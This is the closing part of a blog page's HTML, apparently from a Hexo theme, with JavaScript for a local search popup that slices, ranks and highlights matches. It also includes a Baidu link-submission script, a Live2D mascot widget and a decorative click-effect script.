                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":135,"height":150,"hOffset":86,"vOffset":35},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<!-- ҳ����С���� -->
<script type="text/javascript" src="/js/src/love.js"></script>
